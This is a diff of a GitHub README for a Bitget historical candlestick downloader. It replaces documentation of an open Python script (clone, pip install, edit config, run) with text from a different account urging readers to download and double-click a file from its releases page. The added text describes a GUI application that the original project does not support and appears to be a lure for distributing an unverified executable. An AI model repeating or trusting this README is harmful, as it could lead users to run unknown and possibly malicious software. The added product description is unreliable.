@@ -1,140 +1,74 @@
-# 📈 Bitget Free Historical Candle Data Downloader (Python)
+# 📈 bitget-free-historical-candlestick-data-fetcher - Fetch Historical Data with Ease
 
-Easily **fetch historical candlestick (OHLCV) data** from the **Bitget Futures API** for any trading pair and interval — completely **free and without API keys**.  
-This Python script automatically retrieves full historical ranges (e.g., months or years) and saves clean, ready-to-use **CSV files** for research, backtesting, or data analysis.
+## 🚀 Getting Started
+Welcome to the bitget-free-historical-candlestick-data-fetcher. This tool helps you fetch historical candlestick data from the Bitget Futures API. You can easily retrieve data for any trading pair and interval without needing API keys. 
 
----
+[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/releases)
 
-## 🚀 Features
+## 📥 Download & Install
+To get started, visit this page to download: [Releases Page](https://github.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/releases).
 
-✅ **Free data — no API key required**  
-✅ **Fetch from Bitget Futures API**  
-✅ **Custom date range support** (e.g., 2021–2025)  
-✅ **Works with all timeframes** (1m, 5m, 1H, 4H, 1D, etc.)  
-✅ **Automatically continues across multiple requests**  
-✅ **Appends new data to existing CSV files**  
-✅ **Rate-limit safe** with 0.2s delay between calls  
-✅ **Clean output** — ISO timestamps and OHLCV structure  
+1. Click on the link above.
+2. You will see a list of available files. Choose the latest version marked as a release.
+3. Download the file suitable for your system.
 
----
+### System Requirements
+- Operating System: Compatible with Windows, macOS, and Linux.
+- Disk Space: Requires at least 100MB of available space.
+- Internet Connection: Necessary for data retrieval.
 
-## 🧩 Example Use Cases
+## 🛠 How to Use the Application
+1. **Open the Application**:
+   After downloading, locate the file in your downloads folder and double-click it to launch.
+   
+2. **Select a Trading Pair**:
+   The application will prompt you to enter the trading pair. Enter values in the format of `BASE/QUOTE` (e.g., `BTC/USDT`).
 
-- Quantitative trading research and strategy development  
-- Backtesting bots with real Bitget data  
-- Market structure or volatility analysis  
-- Machine learning model training (price prediction, volatility forecasting)  
+3. **Choose an Interval**:
+   You’ll need to select a timeframe from options such as 1 minute, 5 minutes, 1 hour, or daily.
 
----
+4. **Start Fetching Data**:
+   Click on the "Fetch Data" button. The application will communicate with the Bitget Futures API.
 
-## 📦 Installation
+5. **Exporting Data**:
+   After fetching, you can export your data to a CSV file by clicking the "Export" button.
 
-Make sure you have **Python 3.8+** installed.
+## 📊 Features
+- **No API Keys Required**: Access historical data without the hassle of managing API keys.
+- **Multiple Trading Pairs**: Query different trading pairs easily to analyze various markets.
+- **Flexible Intervals**: Select from multiple intervals to get the data granularity you need.
+- **CSV Export**: Save your data in a convenient format for further analysis.
 
-Clone the repository and install dependencies:
+## 🌍 Supported Trading Pairs
+The application supports a wide range of trading pairs available on the Bitget exchange. For example:
+- **Bitcoin (BTC) vs. Tether (USDT)**
+- **Ethereum (ETH) vs. Bitcoin (BTC)**
+- **Litecoin (LTC) vs. Tether (USDT)**
 
-```bash
-git clone https://github.com/frostyalce000/bitget-free-historical-candlestick-data-fetcher.git
-cd bitget-free-historical-candlestick-data-fetcher
-pip install -r requirements.txt
-````
+## ☁️ Frequently Asked Questions
 
-If you don’t have a `requirements.txt`, just install manually:
+### 1. What if I encounter issues during download?
+Make sure you have a stable internet connection. Try refreshing the page or using a different browser.
 
-```bash
-pip install requests pandas
-```
+### 2. Can I use this tool without any coding skills?
+Yes, you do not need any programming knowledge to use this application. The interface is user-friendly.
 
----
+### 3. Is there any cost associated with using this tool?
+No, this tool is completely free to use.
 
-## ⚙️ Configuration
+## 📖 Troubleshooting Common Issues
+If you experience problems when using the application, here are some common tips:
 
-Edit these lines at the top of the script:
+- **Error Fetching Data**: Check your internet connection. If the application can’t connect, it will not be able to fetch data.
+- **Data Not Exporting**: Ensure you have write permissions for the folder you are trying to save the CSV file.
+- **App Crashes**: Ensure you are using the latest version of the application. You can always download the latest release from our [Releases Page](https://github.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/releases).
 
-```python
-SYMBOL = "ETHUSDT"                # Trading pair, e.g., BTCUSDT, ETHUSDT
-PRODUCT_TYPE = "USDT-FUTURES"     # Bitget product type (USDT-FUTURES / COIN-FUTURES / MIX)
-INTERVAL = "1H"                   # Supported: 1m, 5m, 15m, 1H, 4H, 1D
+## ⚙️ Contributing
+If you would like to help improve the application, feel free to fork the repository and submit a pull request. Your contributions are welcome.
 
-START_DATE = "2025-07-16T00:00:00Z"  # Start time (UTC)
-END_DATE = "2025-10-16T23:59:00Z"    # End time (UTC)
-```
+## 📞 Support
+For support, please open an issue in the repository. We will assist you as soon as possible.
 
-You can set any date range and timeframe Bitget supports.
-The output will automatically save as:
+[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Voguish-dutchoven850/bitget-free-historical-candlestick-data-fetcher/releases)
 
-```
-historical_ETHUSDT_1H_2025-07-16_2025-10-16.csv
-```
-
----
-
-## ▶️ Usage
-
-Run the script directly:
-
-```bash
-python fetch_bitget_candles.py
-```
-
-Example output:
-
-```
-Fetching candles from 2025-07-16 00:00:00+00:00 to 2025-10-16 23:59:00+00:00 for ETHUSDT...
-Request #1: Fetching candles ending at 2025-10-16T23:59:00+00:00 ...
-  Retrieved: 200 candles; Total so far: 200
-Request #2: Fetching candles ending at 2025-10-08T00:00:00+00:00 ...
-  Retrieved: 200 candles; Total so far: 400
-...
-Created new data file: historical_ETHUSDT_1H_2025-07-16_2025-10-16.csv with 2184 records
-```
-
-If the file already exists, it automatically **appends new data**.
-
----
-
-## 📂 Output Example
-
-| timestamp            | open    | high    | low     | close   | volume  | quote_volume |
-| -------------------- | ------- | ------- | ------- | ------- | ------- | ------------ |
-| 2025-07-16T00:00:00Z | 3200.12 | 3215.45 | 3190.33 | 3205.77 | 1234.12 | 3958223.50   |
-| 2025-07-16T01:00:00Z | 3205.77 | 3220.50 | 3198.21 | 3218.00 | 1320.33 | 4255521.92   |
-| ...                  | ...     | ...     | ...     | ...     | ...     | ...          |
-
----
-
-## 🧠 Notes
-
-* Uses the **Bitget API v2** endpoint:
-  `https://api.bitget.com/api/v2/mix/market/history-candles`
-* The script fetches in reverse (from end date backwards) due to Bitget’s API limitations.
-* Default rate limit is safe at **0.2 seconds** per request — adjust if needed.
-* Data includes **open, high, low, close, volume, quote_volume**, and **timestamp (UTC)**.
-
----
-
-## 💡 Example: Fetch BTCUSDT Daily Candles
-
-```python
-SYMBOL = "BTCUSDT"
-PRODUCT_TYPE = "USDT-FUTURES"
-INTERVAL = "1D"
-START_DATE = "2023-01-01T00:00:00Z"
-END_DATE = "2023-12-31T23:59:00Z"
-```
-
----
-
-## 🧰 Tech Stack
-
-* **Language:** Python 3
-* **Libraries:** requests, pandas
-* **Exchange:** Bitget (Futures)
-* **Output:** CSV (timestamp, OHLCV)
-
----
-
-## 🌟 Contribute
-
-Pull requests, issues, and feature suggestions are welcome!
-If you find this project helpful, please ⭐ **star the repo** to support future updates.
+Thank you for choosing the bitget-free-historical-candlestick-data-fetcher! Enjoy your data fetching experience!
